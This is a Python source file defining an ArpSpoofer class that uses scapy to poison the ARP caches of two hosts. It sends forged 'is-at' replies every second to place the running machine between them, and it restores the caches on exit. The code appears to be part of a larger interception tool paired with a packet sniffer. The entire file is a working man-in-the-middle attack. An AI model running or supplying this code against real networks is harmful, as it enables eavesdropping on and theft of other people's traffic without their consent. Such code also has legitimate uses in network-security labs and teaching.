import time
import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import scapy.all as scapy


class ArpSpoofer:

    def __init__(self, target_1_ip, target_2_ip):
        self.target_1 = {"IP": target_1_ip, "MAC": scapy.getmacbyip(target_1_ip)}
        self.target_2 = {"IP": target_2_ip, "MAC": scapy.getmacbyip(target_2_ip)}

    def print_setup(self):
        print("The current setup defined for this attack is: ")
        print("Target n°1 MAC: ", self.target_1["MAC"])
        print("Target n°1 IP: ", self.target_1["IP"])
        print("Target n°2 MAC: ", self.target_2["MAC"])
        print("Target n°2 IP: ", self.target_2["IP"])
        print("#### Press Ctrl+C to finish the attack ####")

    def change_target_1(self, new_ip):
        self.target_1["IP"] = new_ip
        self.target_1["MAC"] = scapy.getmacbyip(new_ip)

    def change_target_2(self, new_ip):
        self.target_2["IP"] = new_ip
        self.target_2["MAC"] = scapy.getmacbyip(new_ip)

    def spoof(self):
        pckt_to_t1 = scapy.ARP(op="is-at", hwdst=self.target_1["MAC"], psrc=self.target_2["IP"],
                               pdst=self.target_1["IP"])
        pckt_to_t2 = scapy.ARP(op="is-at", hwdst=self.target_2["MAC"], psrc=self.target_1["IP"],
                               pdst=self.target_2["IP"])
        scapy.send(pckt_to_t1, verbose=False)
        scapy.send(pckt_to_t2, verbose=False)

    def undo_spoof(self):
        pckt_to_t1 = scapy.ARP(op="is-at", hwsrc=self.target_2["MAC"], hwdst=self.target_1["MAC"],
                               psrc=self.target_2["IP"], pdst=self.target_1["IP"])
        pckt_to_t2 = scapy.ARP(op="is-at", hwsrc=self.target_1["MAC"], hwdst=self.target_2["MAC"],
                               psrc=self.target_1["IP"], pdst=self.target_2["IP"])
        scapy.send(pckt_to_t1, verbose=False)
        scapy.send(pckt_to_t2, verbose=False)
        sys.exit(0)

    @staticmethod
    def should_continue_spoofer(event):
        if event is None:  # This is the case when sniff_packets is used as a standalone Class
            return True
        else:  # This is the case when ArpSpoofer is run as a Thread from main.py
            return not event.isSet()  # If isSet==True, end ArpSpoofer returning False

    def attack(self, event=None):
        try:
            self.print_setup()
            while self.should_continue_spoofer(event):
                self.spoof()
                time.sleep(1)
            self.undo_spoof()
            sys.exit(0)
        except KeyboardInterrupt:  # This interrupt is catch only when running ArpSpoofer as a Standalone class
            self.undo_spoof()
            sys.exit(0)
